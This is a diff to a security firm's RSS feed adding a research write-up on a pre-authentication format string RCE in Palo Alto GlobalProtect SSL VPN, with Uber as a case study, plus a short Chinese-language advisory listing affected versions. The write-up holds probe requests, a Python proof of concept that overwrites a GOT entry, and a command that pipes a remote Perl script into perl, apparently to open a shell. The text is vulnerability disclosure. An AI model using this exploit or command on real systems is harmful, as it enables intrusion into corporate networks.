@@ -4,11 +4,218 @@
         <title>DEVCORE 戴夫寇爾</title>
         <description>DEVCORE 戴夫寇爾 - 滲透測試服務、資安教育訓練、資安顧問服務</description>
         <link>https://devco.re</link>
-        <lastBuildDate>Fri, 21 Jun 2019 21:56:08 +0800</lastBuildDate>
-        <pubDate>Fri, 21 Jun 2019 21:56:08 +0800</pubDate>
+        <lastBuildDate>Wed, 17 Jul 2019 20:21:33 +0800</lastBuildDate>
+        <pubDate>Wed, 17 Jul 2019 20:21:33 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />
 
+
+        <item>
+                <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!</title>
+                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They’re exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.&lt;/p&gt;
+
+&lt;p&gt;We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; talk:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt;!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don’t worry about the spoilers, this story is not included in our BHUSA/DEFCON talks.&lt;/p&gt;
+
+&lt;p&gt;In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)&lt;/p&gt;
+
+&lt;h2 id=&quot;the-story&quot;&gt;The story&lt;/h2&gt;
+
+&lt;p&gt;In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/global-protect/login.esp&lt;/code&gt; on web root!&lt;/p&gt;
+
+&lt;p&gt;About the vulnerability, we accidentally discovered it during our &lt;a href=&quot;https://devco.re/en/services/red-team&quot;&gt;Red Team assessment services&lt;/a&gt;.  At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.&lt;/p&gt;
+
+&lt;p&gt;We searched all over the Internet, but we could not find anything. There is no public RCE exploit before[1], no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;[1] There are some exploit about the  Pan-OS management interface before such as the &lt;a href=&quot;https://www.exploit-db.com/exploits/43342&quot;&gt;CVE-2017-15944&lt;/a&gt; and the excellent &lt;a href=&quot;https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/&quot;&gt;Troppers16 paper&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_fel1x&quot;&gt;@_fel1x&lt;/a&gt;, but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-bug&quot;&gt;The bug&lt;/h2&gt;
+
+&lt;p&gt;The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path &lt;code class=&quot;highlighter-rouge&quot;&gt;/sslmgr&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://global-protect/sslmgr
+&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; ?&amp;gt;
+        &amp;lt;clientcert-response&amp;gt;
+                &amp;lt;status&amp;gt;error&amp;lt;/status&amp;gt;
+                &amp;lt;msg&amp;gt;Invalid parameters&amp;lt;/msg&amp;gt;
+        &amp;lt;/clientcert-response&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;During the parameter extraction, the daemon searches the string &lt;code class=&quot;highlighter-rouge&quot;&gt;scep-profile-name&lt;/code&gt; and pass its value as the &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; format to fill in the buffer. That leads to the format string attack. You can just crash the service with &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt;!&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/sslmgr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;global-protect&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;36&lt;/span&gt;
+
+scep-profile-name=%n%n%n%n%n...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;affect-versions&quot;&gt;Affect versions&lt;/h2&gt;
+
+&lt;p&gt;According to our survey, all the GlobalProtect before &lt;code class=&quot;highlighter-rouge&quot;&gt;July 2018&lt;/code&gt; are vulnerable! Here is the affect version list:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
+  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
+  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The series 9.x and 7.0.x are not affected by this vulnerability.&lt;/p&gt;
+
+&lt;h2 id=&quot;how-to-verify-the-bug&quot;&gt;How to verify the bug&lt;/h2&gt;
+
+&lt;p&gt;Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we can’t obtain any address-leak to verify the bug. And to crash the service is never our first choice[1]. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!&lt;/p&gt;
+
+&lt;p&gt;By reading the &lt;a href=&quot;https://linux.die.net/man/3/snprintf&quot;&gt;snprintf manual&lt;/a&gt;, we choose  the &lt;code class=&quot;highlighter-rouge&quot;&gt;%c&lt;/code&gt; as our gadget! When there is a number before the format, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;%9999999c&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%9999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
+real    0m1.721s
+user    0m0.037s
+sys     0m0.005s
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%99999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
+real    0m2.051s
+user    0m0.035s
+sys     0m0.012s
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=%999999999c&#39;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
+real    0m5.324s
+user    0m0.021s
+sys     0m0.018s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, the response time increases along with the number of &lt;code class=&quot;highlighter-rouge&quot;&gt;%c&lt;/code&gt;. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;[1] Although there is a watchdog monitoring the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; daemon, it’s still improper to crash a service!&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-exploitation&quot;&gt;The exploitation&lt;/h2&gt;
+
+&lt;p&gt;Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the &lt;code class=&quot;highlighter-rouge&quot;&gt;/global-protect/portal/css/login.css&lt;/code&gt; from 8.x version and the &lt;code class=&quot;highlighter-rouge&quot;&gt;/images/logo_pan_158.gif&lt;/code&gt; from 7.x version!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; https://sslvpn/global-protect/portal/css/login.css | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Last-Modified
+Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With a specified version, we can write our own exploit now. We simply modified the pointer of &lt;code class=&quot;highlighter-rouge&quot;&gt;strlen&lt;/code&gt; on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;. Here is the PoC:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/sslmgr&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo pwned &amp;gt; /var/appweb/sslvpndocs/hacked.txt&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x667788&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x445566&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%70&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$n&#39;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;c&#39;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%32&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&#39;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;c&#39;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%24&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&#39;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;$p&#39;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;scep-profile-name=&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;host-id=&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;user-email=&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once the modification is done, the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; becomes our webshell and we can execute commands via:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;scep-profile-name=curl orange.tw/bc.pl | perl -&#39;&lt;/span&gt; https://global-protect/sslmgr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have reported this bug to Palo Alto via the &lt;a href=&quot;https://securityadvisories.paloaltonetworks.com/Report&quot;&gt;report form&lt;/a&gt;. However, we got the following reply:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Hello Orange,&lt;/p&gt;
+
+  &lt;p&gt;Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.&lt;/p&gt;
+
+  &lt;p&gt;Kind regards&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!&lt;/p&gt;
+
+&lt;h2 id=&quot;the-case-study&quot;&gt;The case study&lt;/h2&gt;
+
+&lt;p&gt;After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take &lt;code class=&quot;highlighter-rouge&quot;&gt;vpn.awscorp.uberinternal.com&lt;/code&gt; as an example!&lt;/p&gt;
+
+&lt;p&gt;From the domain name, we guess Uber uses the BYOL from &lt;a href=&quot;https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&amp;amp;sr=0-1&amp;amp;ref_=srh_res_product_title&quot;&gt;AWS Marketplace&lt;/a&gt;. From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;8.0.3&lt;/li&gt;
+  &lt;li&gt;8.0.6&lt;/li&gt;
+  &lt;li&gt;8.0.8&lt;/li&gt;
+  &lt;li&gt;8.0.9&lt;/li&gt;
+  &lt;li&gt;8.1.0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Finally, we figured out the version, it’s 8.0.6 and we got the shell back!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190717/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Hey @orange — we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.&lt;/p&gt;
+
+  &lt;p&gt;Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It’s a fair decision. It’s always a great time communicating with Uber and report to their &lt;a href=&quot;https://hackerone.com/uber&quot;&gt;bug bounty program&lt;/a&gt;. We don’t care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!&lt;/p&gt;
+</description>
+                <link>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/</link>
+                <guid>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study</guid>
+                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
+        </item>
+
+        <item>
+                <title>Palo Alto GlobalProtect 資安通報</title>
+                <description>&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;
+
+&lt;p&gt;在我們進行&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練&lt;/a&gt;的過程中，發現目標使用的 Palo Alto GlobalProtect 存在 format string 弱點，透過此弱點可控制該 SSL VPN 伺服器，並藉此進入企業內網。&lt;/p&gt;
+
+&lt;p&gt;回報原廠後，得知這是個已知弱點並且已經 silent-fix 了，所以並未有 CVE 編號。經過我們分析，存在風險的版本如下，建議用戶儘速更新至最新版以避免遭受攻擊。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
+  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
+  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;9.x 和 7.0.x 並沒有存在風險。&lt;/p&gt;
+
+&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;
+
+&lt;p&gt;我們也利用了這個弱點成功控制了 Uber 的 VPN 伺服器，詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
+&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;
+
